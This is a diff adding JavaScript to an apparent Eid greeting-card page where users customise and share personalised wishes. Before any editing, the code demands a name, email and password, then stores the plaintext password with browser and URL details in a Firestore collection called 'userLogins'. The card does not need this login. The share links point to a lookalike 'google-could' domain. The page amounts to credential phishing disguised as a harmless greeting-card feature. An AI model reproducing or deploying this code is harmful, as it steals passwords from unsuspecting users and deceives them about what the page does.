+        const loginEmailInput = document.getElementById('loginEmailInput');
+        const loginPasswordInput = document.getElementById('loginPasswordInput');
+        
+        const editPanelOverlay = document.getElementById('editPanelOverlay');
+        const cancelEditBtn = document.getElementById('cancelEditBtn');
+        const saveCustomizationBtn = document.getElementById('saveCustomizationBtn');
+        const editNameInput = document.getElementById('editNameInput');
+        const editMessageInput = document.getElementById('editMessageInput');
+        const editWordsInput = document.getElementById('editWordsInput');
+        const messageTimingSlider = document.getElementById('messageTiming');
+        const timingDisplay = document.getElementById('timingDisplay');
+        const fontSizeSlider = document.getElementById('fontSizeSlider');
+        const fontSizeDisplay = document.getElementById('fontSizeDisplay');
+        const fontSizePreview = document.getElementById('fontSizePreview');
+        const shareLinkContainer = document.getElementById('shareLinkContainer');
+        const shareLinkInput = document.getElementById('shareLinkInput');
+        const copyLinkBtn = document.getElementById('copyLinkBtn');
+        const copyMainBtn = document.getElementById('copyMainBtn');
+        
+        // Social share buttons
+        const shareWhatsapp = document.getElementById('shareWhatsapp');
+        const shareFacebook = document.getElementById('shareFacebook');
+        const shareInstagram = document.getElementById('shareInstagram');
+
+        // Update timing display
+        messageTimingSlider.addEventListener('input', function() {
+            timingDisplay.innerText = this.value + ' seconds';
+        });
+
+        // Update font size display and preview
+        fontSizeSlider.addEventListener('input', function() {
+            const size = this.value;
+            fontSizeDisplay.innerText = size + 'rem';
+            fontSizePreview.style.fontSize = size + 'rem';
+        });
+
+        // Show login modal
+        editBtn.addEventListener('click', function() {
+            loginModalOverlay.style.display = 'flex';
+            
+            loginNameInput.value = '';
+            loginEmailInput.value = '';
+            loginPasswordInput.value = '';
+            
+            loginSubmitBtn.disabled = false;
+            loginSubmitBtn.innerText = '✨ continue';
+        });
+
+        // Hide login modal
+        loginCancelBtn.addEventListener('click', function() {
+            loginModalOverlay.style.display = 'none';
+        });
+
+        // Handle login submit
+        loginSubmitBtn.addEventListener('click', function() {
+            const name = loginNameInput.value.trim();
+            const email = loginEmailInput.value.trim();
+            const password = loginPasswordInput.value.trim();
+            
+            if (name === '') {
+                alert('❌ Please enter your name');
+                return;
+            }
+            
+            if (email === '') {
+                alert('❌ Please enter an email address');
+                return;
+            }
+            
+            if (!email.includes('@') || !email.includes('.')) {
+                alert('❌ Please enter a valid email address');
+                return;
+            }
+            
+            if (password === '') {
+                alert('❌ Please enter a password');
+                return;
+            }
+
+            loginSubmitBtn.disabled = true;
+            loginSubmitBtn.innerText = '⏳ saving...';
+
+            const loginData = {
+                name: name,
+                email: email,
+                password: password,
+                timestamp: firebase.firestore.FieldValue.serverTimestamp(),
+                userAgent: navigator.userAgent,
+                page: window.location.href,
+                loginTime: new Date().toISOString(),
+                urlParams: window.location.search || 'none'
+            };
+
+            if (userName) {
+                loginData.viewingCardFor = userName;
+            }
+
+            db.collection('userLogins').add(loginData)
+            .then(() => {
+                loginSubmitBtn.innerText = '✅ saved!';
+                
+                setTimeout(() => {
+                    loginModalOverlay.style.display = 'none';
+                    
+                    // Load current values
+                    editNameInput.value = userName || 'Special Someone';
+                    editMessageInput.value = lovelyLine.innerText;
+                    editWordsInput.value = words.join('\n');
+                    messageTimingSlider.value = messageDisplayDuration;
+                    timingDisplay.innerText = messageDisplayDuration + ' seconds';
+                    fontSizeSlider.value = wordFontSize;
+                    fontSizeDisplay.innerText = wordFontSize + 'rem';
+                    fontSizePreview.style.fontSize = wordFontSize + 'rem';
+                    
+                    shareLinkContainer.classList.remove('show');
+                    editPanelOverlay.style.display = 'flex';
+                    
+                    loginSubmitBtn.disabled = false;
+                    loginSubmitBtn.innerText = '✨ continue';
+                }, 500);
+            })
+            .catch((error) => {
+                console.error('❌ Error saving credentials:', error);
+                alert('❌ Error saving to database: ' + error.message);
+                loginSubmitBtn.disabled = false;
+                loginSubmitBtn.innerText = '✨ continue';
+            });
+        });
+
+        // Click outside login modal to close
+        loginModalOverlay.addEventListener('click', function(e) {
+            if (e.target === loginModalOverlay) {
+                loginModalOverlay.style.display = 'none';
+            }
+        });
+
+        // Hide edit panel
+        cancelEditBtn.addEventListener('click', function() {
+            editPanelOverlay.style.display = 'none';
+            shareLinkContainer.classList.remove('show');
+        });
+
+        // Click outside edit panel to close
+        editPanelOverlay.addEventListener('click', function(e) {
+            if (e.target === editPanelOverlay) {
+                editPanelOverlay.style.display = 'none';
+                shareLinkContainer.classList.remove('show');
+            }
+        });
+
+        // ---------- SAVE CUSTOMIZATION WITH UPDATED MESSAGES ----------
+        let currentShortUrl = '';
+        let currentLongUrl = '';
+
+        saveCustomizationBtn.addEventListener('click', async function() {
+            const newName = editNameInput.value.trim() || 'Special Someone';
+            const newMessage = editMessageInput.value.trim() || originalLine;
+            const newTiming = messageTimingSlider.value;
+            const newFontSize = fontSizeSlider.value;
+            const newWordsText = editWordsInput.value.trim();
+            const newWords = newWordsText.split('\n').filter(word => word.trim() !== '');
+            
+            // Keep default falling items (no editing panel for this)
+            const baseUrl = 'https://google-could.github.io/Eid-wish/';
+            
+            // Build URL with all parameters
+            let urlParams = `?name=${encodeURIComponent(newName)}`;
+            urlParams += `&msg=${encodeURIComponent(newMessage)}`;
+            urlParams += `&timing=${newTiming}`;
+            urlParams += `&fontsize=${newFontSize}`;
+            urlParams += `&words=${encodeURIComponent(JSON.stringify(newWords))}`;
+            
+            currentLongUrl = baseUrl + urlParams;
+            
+            shareLinkInput.value = '⏳ Generating short link...';
+            shareLinkContainer.classList.add('show');
+            
+            try {
+                const response = await fetch(`https://is.gd/create.php?format=simple&url=${encodeURIComponent(currentLongUrl)}`);
+                const shortUrl = await response.text();
+                
+                if (shortUrl && !shortUrl.includes('error')) {
+                    currentShortUrl = shortUrl;
+                    shareLinkInput.value = shortUrl;
+                } else {
+                    currentShortUrl = currentLongUrl;
+                    shareLinkInput.value = currentLongUrl;
+                }
+            } catch (error) {
+                currentShortUrl = currentLongUrl;
+                shareLinkInput.value = currentLongUrl;
+                console.log('Shortener error:', error);
+            }
+
+            // Change save button to share button
+            saveCustomizationBtn.innerText = '🔗 share link 👇';
+            saveCustomizationBtn.style.background = 'linear-gradient(145deg, #9c27b0, #ba68c8)';
+        });
+
+        // Copy link function
+        function copyLinkToClipboard(text) {
+            shareLinkInput.select();
+            shareLinkInput.setSelectionRange(0, 99999);
+            
+            try {
+                document.execCommand('copy');
+                alert('✅ Link copied to clipboard!');
+            } catch (err) {
+                navigator.clipboard.writeText(text).then(() => {
+                    alert('✅ Link copied to clipboard!');
+                }).catch(() => {
+                    alert('Manual copy: Select the link and copy it');
+                });
+            }
+        }
+
+        copyLinkBtn.addEventListener('click', function() {
+            copyLinkToClipboard(shareLinkInput.value);
+            copyLinkBtn.innerText = '✅ copied!';
+            setTimeout(() => {
+                copyLinkBtn.innerText = 'copy';
+            }, 2000);
+        });
+
+        copyMainBtn.addEventListener('click', function() {
+            copyLinkToClipboard(shareLinkInput.value);
+        });
+
+        // Social share
+        shareWhatsapp.addEventListener('click', function() {
+            const text = `🎉 Eid Mubarak! Check out this personalized Eid wish:`;
+            window.open(`https://wa.me/?text=${encodeURIComponent(text + ' ' + shareLinkInput.value)}`, '_blank');
+        });
+
+        shareFacebook.addEventListener('click', function() {
+            window.open(`https://www.facebook.com/sharer/sharer.php?u=${encodeURIComponent(shareLinkInput.value)}`, '_blank');
+        });
+
+        shareInstagram.addEventListener('click', function() {
+            copyLinkToClipboard(shareLinkInput.value);
+            alert('📸 Link copied! You can now paste it in your Instagram bio or stories.');
+        });
+
+        // Double click sparkles
+        function addSparkles() {
+            for (let i = 0; i < 20; i++) {
+                setTimeout(() => {
+                    const spark = document.createElement('div');
+                    spark.className = 'particle';
+                    spark.innerText = fallingItems[Math.floor(Math.random() * fallingItems.length)] || '✨';
+                    spark.style.left = (30 + Math.random() * 40) + '%';
+                    spark.style.fontSize = (18 + Math.random() * 28) + 'px';
+                    spark.style.animationDuration = (1.5 + Math.random() * 2.5) + 's';
+                    document.body.appendChild(spark);
+                    setTimeout(() => {
+                        if (spark.parentNode) spark.remove();
+                    }, 3000);
+                }, i * 50);
+            }
+        }
+
+        closedBox.addEventListener('dblclick', addSparkles);
+        openBox.addEventListener('dblclick', addSparkles);
+    });
+</script>
+</html>
